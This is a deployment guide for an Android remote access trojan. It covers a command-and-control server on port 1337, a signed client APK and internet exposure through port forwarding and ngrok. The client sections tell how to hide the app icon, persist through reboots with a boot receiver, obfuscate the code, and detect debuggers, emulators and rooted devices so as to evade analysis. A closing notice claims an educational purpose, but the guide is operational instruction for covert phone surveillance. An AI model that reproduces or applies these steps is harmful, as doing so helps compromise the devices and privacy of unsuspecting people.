# RAT System Deployment Guide

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Server Deployment](#server-deployment)
3. [Client Deployment](#client-deployment)
4. [Network Configuration](#network-configuration)
5. [Security Considerations](#security-considerations)
6. [Production Deployment](#production-deployment)

## Prerequisites

### System Requirements

#### Server Requirements
- **Operating System**: Linux (Ubuntu 20.04+), Windows 10+, macOS 10.15+
- **Python**: Version 3.8 or higher
- **Memory**: Minimum 512MB RAM, Recommended 2GB+
- **Storage**: 1GB free space for logs and data
- **Network**: Static IP or dynamic DNS recommended

#### Client Requirements
- **Android**: API Level 21+ (Android 5.0+)
- **Architecture**: ARM64, ARM32, x86, x86_64
- **Memory**: Minimum 100MB RAM
- **Storage**: 50MB free space
- **Permissions**: Various Android permissions as needed

#### Development Requirements
- **Android Studio**: Latest version with SDK
- **Java**: JDK 11 or higher
- **Gradle**: 7.0+ (included with Android Studio)
- **ADB**: Android Debug Bridge for testing

## Server Deployment

### Development Environment

#### 1. Clone Repository
```bash
git clone <repository-url>
cd Project_normad/Server_normad
```

#### 2. Setup Python Environment
```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate     # Windows

# Install dependencies
pip install -r requirements.txt
```

#### 3. Configure Server
```bash
# Copy configuration template
cp config/server_config.json.example config/server_config.json

# Edit configuration
nano config/server_config.json
```

#### 4. Start Development Server
```bash
python3 main.py --host 0.0.0.0 --port 1337
```

### Production Environment

#### 1. System Setup (Ubuntu/Debian)
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Python and dependencies
sudo apt install python3 python3-pip python3-venv git -y

# Create dedicated user
sudo useradd -m -s /bin/bash ratserver
sudo su - ratserver
```

#### 2. Application Setup
```bash
# Clone and setup
git clone <repository-url> /home/ratserver/rat-system
cd /home/ratserver/rat-system/Server_normad

# Setup virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

#### 3. Configuration
```bash
# Create production config
cat > config/server_config.json << EOF
{
    "server": {
        "host": "0.0.0.0",
        "port": 1337,
        "max_clients": 100,
        "timeout": 300
    },
    "logging": {
        "level": "INFO",
        "file": "/home/ratserver/logs/server.log",
        "max_size": "10MB",
        "backup_count": 5
    },
    "security": {
        "max_command_length": 1024,
        "rate_limit": 10,
        "blacklist_ips": []
    }
}
EOF

# Create log directory
mkdir -p /home/ratserver/logs
```

#### 4. Systemd Service (Linux)
```bash
# Create service file
sudo cat > /etc/systemd/system/ratserver.service << EOF
[Unit]
Description=RAT Server
After=network.target

[Service]
Type=simple
User=ratserver
Group=ratserver
WorkingDirectory=/home/ratserver/rat-system/Server_normad
Environment=PATH=/home/ratserver/rat-system/Server_normad/venv/bin
ExecStart=/home/ratserver/rat-system/Server_normad/venv/bin/python main.py --no-cli
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
sudo systemctl daemon-reload
sudo systemctl enable ratserver
sudo systemctl start ratserver

# Check status
sudo systemctl status ratserver
```

#### 5. Docker Deployment
```dockerfile
# Dockerfile
FROM python:3.9-slim

WORKDIR /app
COPY Server_normad/ .

RUN pip install -r requirements.txt

EXPOSE 1337

CMD ["python", "main.py", "--host", "0.0.0.0", "--port", "1337", "--no-cli"]
```

```bash
# Build and run
docker build -t rat-server .
docker run -d -p 1337:1337 --name rat-server rat-server
```

## Client Deployment

### Development Build

#### 1. Setup Android Development
```bash
# Install Android Studio and SDK
# Set ANDROID_HOME environment variable
export ANDROID_HOME=$HOME/Android/Sdk
export PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools
```

#### 2. Build Debug APK
```bash
cd Project_normad/Client_normad

# Build debug version
./gradlew assembleDebug

# Install on connected device/emulator
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### Production Build

#### 1. Generate Signing Key
```bash
# Generate keystore
keytool -genkey -v -keystore rat-release-key.keystore -alias rat-key -keyalg RSA -keysize 2048 -validity 10000

# Store keystore securely
mv rat-release-key.keystore ~/.android/
```

#### 2. Configure Signing
```bash
# Create gradle.properties
cat > ~/.gradle/gradle.properties << EOF
RAT_RELEASE_STORE_FILE=/home/user/.android/rat-release-key.keystore
RAT_RELEASE_KEY_ALIAS=rat-key
RAT_RELEASE_STORE_PASSWORD=your_store_password
RAT_RELEASE_KEY_PASSWORD=your_key_password
EOF
```

#### 3. Update Build Configuration
```kotlin
// app/build.gradle.kts
android {
    signingConfigs {
        create("release") {
            storeFile = file(project.findProperty("RAT_RELEASE_STORE_FILE") as String)
            storePassword = project.findProperty("RAT_RELEASE_STORE_PASSWORD") as String
            keyAlias = project.findProperty("RAT_RELEASE_KEY_ALIAS") as String
            keyPassword = project.findProperty("RAT_RELEASE_KEY_PASSWORD") as String
        }
    }
    
    buildTypes {
        release {
            isMinifyEnabled = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
            signingConfig = signingConfigs.getByName("release")
        }
    }
}
```

#### 4. Build Release APK
```bash
# Build release version
./gradlew assembleRelease

# Verify signing
jarsigner -verify -verbose -certs app/build/outputs/apk/release/app-release.apk
```

### Client Configuration

#### 1. Server Connection Settings
```kotlin
// Update in RATService.kt
companion object {
    private const val SERVER_HOST = "your-server-ip"
    private const val SERVER_PORT = 1337
    private const val RECONNECT_DELAY = 10000L
}
```

#### 2. Stealth Configuration
```xml
<!-- AndroidManifest.xml - Hide app icon -->
<activity
    android:name=".MainActivity"
    android:exported="true"
    android:theme="@android:style/Theme.NoDisplay">
    <!-- Remove intent-filter to hide from launcher -->
</activity>
```

#### 3. Persistence Configuration
```xml
<!-- Add boot receiver -->
<receiver android:name=".BootReceiver"
    android:enabled="true"
    android:exported="true">
    <intent-filter android:priority="1000">
        <action android:name="android.intent.action.BOOT_COMPLETED" />
        <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
        <action android:name="android.intent.action.PACKAGE_REPLACED" />
        <data android:scheme="package" />
    </intent-filter>
</receiver>
```

## Network Configuration

### Firewall Configuration

#### Linux (UFW)
```bash
# Allow RAT server port
sudo ufw allow 1337/tcp

# Allow from specific IP range only
sudo ufw allow from 192.168.1.0/24 to any port 1337
```

#### Windows Firewall
```powershell
# Allow inbound connections
New-NetFirewallRule -DisplayName "RAT Server" -Direction Inbound -Protocol TCP -LocalPort 1337 -Action Allow
```

### Port Forwarding

#### Router Configuration
1. Access router admin panel (usually 192.168.1.1)
2. Navigate to Port Forwarding/Virtual Servers
3. Add rule:
   - **Service Name**: RAT Server
   - **External Port**: 1337
   - **Internal IP**: Server IP address
   - **Internal Port**: 1337
   - **Protocol**: TCP

#### Dynamic DNS Setup
```bash
# Install ddclient (Linux)
sudo apt install ddclient

# Configure for No-IP
sudo nano /etc/ddclient.conf
```

### VPN/Tunnel Setup

#### SSH Tunnel
```bash
# Client to server tunnel
ssh -L 1337:localhost:1337 user@server-ip

# Reverse tunnel (server to client)
ssh -R 1337:localhost:1337 user@client-ip
```

#### Ngrok (Development)
```bash
# Install ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip

# Expose local server
./ngrok tcp 1337
```

## Security Considerations

### Server Security

#### 1. Access Control
```python
# Implement IP whitelist
ALLOWED_IPS = ['192.168.1.0/24', '10.0.0.0/8']

# Rate limiting
from collections import defaultdict
import time

class RateLimiter:
    def __init__(self, max_requests=10, window=60):
        self.max_requests = max_requests
        self.window = window
        self.requests = defaultdict(list)
    
    def is_allowed(self, ip):
        now = time.time()
        self.requests[ip] = [req for req in self.requests[ip] if now - req < self.window]
        
        if len(self.requests[ip]) >= self.max_requests:
            return False
        
        self.requests[ip].append(now)
        return True
```

#### 2. Encryption
```python
# Add TLS/SSL support
import ssl

context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile="server.crt", keyfile="server.key")

# Wrap socket with SSL
ssl_socket = context.wrap_socket(socket, server_side=True)
```

#### 3. Authentication
```python
# Simple token-based auth
import hashlib
import secrets

class AuthManager:
    def __init__(self):
        self.tokens = set()
    
    def generate_token(self):
        token = secrets.token_hex(32)
        self.tokens.add(hashlib.sha256(token.encode()).hexdigest())
        return token
    
    def verify_token(self, token):
        return hashlib.sha256(token.encode()).hexdigest() in self.tokens
```

### Client Security

#### 1. Obfuscation
```bash
# Use ProGuard for code obfuscation
# Add to proguard-rules.pro
-keep class com.hidden.client_normad.** { *; }
-obfuscate
-repackageclasses ''
```

#### 2. Anti-Analysis
```kotlin
// Detect debugging
fun isDebugging(): Boolean {
    return Debug.isDebuggerConnected() || 
           BuildConfig.DEBUG ||
           (applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE) != 0
}

// Detect emulator
fun isEmulator(): Boolean {
    return Build.FINGERPRINT.startsWith("generic") ||
           Build.FINGERPRINT.startsWith("unknown") ||
           Build.MODEL.contains("google_sdk") ||
           Build.MODEL.contains("Emulator")
}
```

#### 3. Root Detection
```kotlin
fun isRooted(): Boolean {
    val paths = arrayOf(
        "/system/app/Superuser.apk",
        "/sbin/su",
        "/system/bin/su",
        "/system/xbin/su"
    )
    
    return paths.any { File(it).exists() }
}
```

## Production Deployment

### Monitoring

#### 1. Server Monitoring
```bash
# Install monitoring tools
sudo apt install htop iotop nethogs

# Monitor server resources
htop
iotop -o
nethogs

# Check logs
tail -f /home/ratserver/logs/server.log
```

#### 2. Log Analysis
```python
# Log analysis script
import re
from collections import Counter

def analyze_logs(log_file):
    with open(log_file, 'r') as f:
        logs = f.readlines()
    
    # Extract IP addresses
    ips = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', ' '.join(logs))
    
    # Count connections per IP
    ip_counts = Counter(ips)
    
    print("Top connecting IPs:")
    for ip, count in ip_counts.most_common(10):
        print(f"{ip}: {count} connections")
```

### Backup and Recovery

#### 1. Configuration Backup
```bash
# Backup script
#!/bin/bash
BACKUP_DIR="/backup/rat-system/$(date +%Y%m%d)"
mkdir -p $BACKUP_DIR

# Backup configuration
cp -r /home/ratserver/rat-system/Server_normad/config $BACKUP_DIR/
cp -r /home/ratserver/logs $BACKUP_DIR/

# Compress backup
tar -czf $BACKUP_DIR.tar.gz $BACKUP_DIR
rm -rf $BACKUP_DIR
```

#### 2. Automated Backups
```bash
# Add to crontab
crontab -e

# Daily backup at 2 AM
0 2 * * * /home/ratserver/backup.sh
```

### Scaling

#### 1. Load Balancing
```python
# Simple round-robin load balancer
class LoadBalancer:
    def __init__(self, servers):
        self.servers = servers
        self.current = 0
    
    def get_server(self):
        server = self.servers[self.current]
        self.current = (self.current + 1) % len(self.servers)
        return server
```

#### 2. Database Integration
```python
# Add database for session persistence
import sqlite3

class SessionDB:
    def __init__(self, db_path):
        self.conn = sqlite3.connect(db_path)
        self.create_tables()
    
    def create_tables(self):
        self.conn.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY,
                ip TEXT,
                device_info TEXT,
                connected_at TIMESTAMP,
                last_seen TIMESTAMP
            )
        ''')
```

---

## Legal Notice

This deployment guide is for educational and authorized testing purposes only. Ensure you have proper authorization and comply with all applicable laws and regulations before deploying this system. Unauthorized access to computer systems is illegal in most jurisdictions.
